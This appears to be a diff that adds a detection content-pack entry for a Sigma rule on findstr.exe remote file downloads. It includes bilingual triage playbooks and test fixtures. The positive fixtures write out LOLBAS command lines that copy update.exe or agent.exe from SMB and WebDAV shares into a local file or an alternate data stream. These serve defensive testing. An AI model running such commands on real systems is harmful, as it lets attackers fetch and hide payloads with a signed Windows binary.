@@ -1,0 +1,132 @@
+{
+  "rule": {
+    "id": "587254ee-a24b-4335-b3cd-065c0f1f4baa",
+    "title": "Remote File Download Via Findstr.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative, Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_findstr_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_findstr_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1105",
+      "T1218",
+      "T1552.001",
+      "T1564.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó findstr.exe con los flags /V y /L contra una ruta UNC. Es la técnica LOLBAS para copiar el contenido de un archivo remoto a un archivo local o a un alternate data stream (ADS).",
+      "what_it_detects": "Eventos de creación de procesos en los que findstr se identifica por CommandLine, Image u OriginalFileName, y el CommandLine incluye ' -v ' y ' -l ' (o sus variantes con barra o guion) junto con una ruta de recurso compartido '\\\\'.",
+      "why_it_matters": "Un atacante puede usar un binario firmado de Windows para traer herramientas desde recursos SMB o WebDAV (T1105, T1218). También puede ocultar el contenido en un ADS (T1564.004) o buscar credenciales en archivos (T1552.001).",
+      "triage_steps": [
+        "Lea el CommandLine completo: identifique el host y el recurso UNC, la cadena de búsqueda y la redirección ('>') hacia una ruta local o un ADS como archivo.txt:payload.exe.",
+        "Determine si el host remoto es un servidor de archivos interno o una IP o endpoint WebDAV externo (busque @SSL o DavWWWRoot). Revise su reputación.",
+        "Revise ParentImage y la línea de comandos del proceso padre. Considere sospechoso un cmd.exe o powershell.exe lanzado por Office, por wscript o por otros intérpretes de scripts.",
+        "Haga un pivot sobre el mismo host en +/- 15 minutos: creación del archivo de salida, nuevos ADS y conexiones de red al host UNC por los puertos 445 u 80/443.",
+        "Busque si el archivo o el stream de salida se ejecutó después, por ejemplo con wmic, rundll32 o start, y obtenga su hash.",
+        "Valide al usuario: ¿se espera que ejecute scripts administrativos en este equipo? Revise alertas previas del mismo usuario, host o servidor remoto."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos. En casos raros, un administrador o un script de inicio de sesión heredado filtra un archivo de un recurso corporativo con findstr /V /L y guarda el resultado localmente.",
+        "Scripts de despliegue de software o de inventario que procesan archivos de texto en servidores internos."
+      ],
+      "response_steps": [
+        "Confirme con el usuario o con el dueño del script. Si la actividad es maliciosa o no tiene explicación, recolecte el archivo de salida, los ADS y sus hashes.",
+        "Aísle el endpoint si se escribió o ejecutó un payload. Bloquee el host remoto en el firewall o en el proxy.",
+        "Elimine los archivos y streams descargados solo después de preservar la evidencia. Busque el mismo host UNC y la misma línea de comandos en toda la flota.",
+        "Restablezca las credenciales del usuario si se confirma búsqueda de credenciales o ejecución. Después, restaure el equipo a un estado confiable si hace falta."
+      ],
+      "severity_rationale": "El nivel medio es adecuado: esta combinación de flags y ruta UNC es rara en uso legítimo e indica transferencia de archivos, pero no prueba que el payload se haya ejecutado."
+    },
+    "en": {
+      "summary": "findstr.exe ran with the /V and /L flags against a UNC path. This is the LOLBAS technique for copying a remote file's content to a local file or an alternate data stream (ADS).",
+      "what_it_detects": "Process creation events where findstr is identified by CommandLine, Image or OriginalFileName, and the CommandLine contains ' -v ' and ' -l ' (or slash/dash variants) and a '\\\\' remote share path.",
+      "why_it_matters": "Attackers can use a signed Windows binary to fetch tools from SMB or WebDAV shares (T1105, T1218). They may hide the content in an alternate data stream (T1564.004) or use it to search for credentials in files (T1552.001).",
+      "triage_steps": [
+        "Read the full CommandLine: find the UNC host and share, the search string, and any output redirection ('>') to a local path or an ADS such as file.txt:payload.exe.",
+        "Check if the remote host is an internal file server or an external IP or WebDAV endpoint (look for @SSL or DavWWWRoot). Check its reputation.",
+        "Review ParentImage and the parent's command line. Treat cmd.exe or powershell.exe launched by Office, script hosts or wscript as suspicious.",
+        "Pivot on the same host within +/- 15 minutes: file creation events for the output file, new ADS, and network connections to the UNC host on ports 445 or 80/443.",
+        "Find any later execution of the output file or the stream, for example via wmic, rundll32 or start, and get its hash.",
+        "Check the user: is it expected to run admin scripts on this host? Look for earlier alerts on the same user, host or remote server."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Rarely, an admin or legacy logon script filters a file on a corporate share with findstr /V /L and saves the result locally.",
+        "Software deployment or inventory scripts that parse text files on internal servers."
+      ],
+      "response_steps": [
+        "Verify with the user or the script owner. If the activity is malicious or unexplained, collect the output file, any ADS and their hashes.",
+        "Isolate the endpoint if a payload was written or executed. Block the remote host at the firewall or proxy.",
+        "Remove the dropped files and streams only after you have preserved evidence. Hunt for the same UNC host and command line across the fleet.",
+        "Reset the user's credentials if credential searching or execution is confirmed. Then restore the host from a known-good state if needed."
+      ],
+      "severity_rationale": "Medium fits: this flag-and-UNC combination is rare in legitimate use and points to file transfer, but it does not prove the payload was executed."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "LOLBAS-style download from a remote SMB share into an alternate data stream using slash flags.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\findstr.exe",
+          "OriginalFileName": "FINDSTR.EXE",
+          "CommandLine": "findstr /V /L W3AllLov3LolBas \\\\203.0.113.10\\share\\update.exe > C:\\Users\\Public\\notes.txt:update.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c run.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "Dash-flag variant pulling a file over WebDAV into the temp folder.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Windows\\System32\\findstr.exe",
+          "OriginalFileName": "FINDSTR.EXE",
+          "CommandLine": "findstr.exe -v -l \"zzqq\" \\\\files.example.org@SSL\\DavWWWRoot\\tools\\agent.txt > C:\\Users\\mrodriguez\\AppData\\Local\\Temp\\agent.exe",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CurrentDirectory": "C:\\Users\\mrodriguez\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin filtering a local log with /V /L; there is no UNC path, so selection_cli_download_3 does not match.",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP-03.andes.example.com",
+          "User": "ANDES\\svc_logs",
+          "Image": "C:\\Windows\\System32\\findstr.exe",
+          "OriginalFileName": "FINDSTR.EXE",
+          "CommandLine": "findstr /V /L \"DEBUG\" C:\\Logs\\app.log > C:\\Logs\\app_filtered.log",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Case-insensitive search on a corporate share without the /V and /L flags.",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\findstr.exe",
+          "OriginalFileName": "FINDSTR.EXE",
+          "CommandLine": "findstr /S /I \"invoice\" \\\\fileserver01\\finance\\*.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
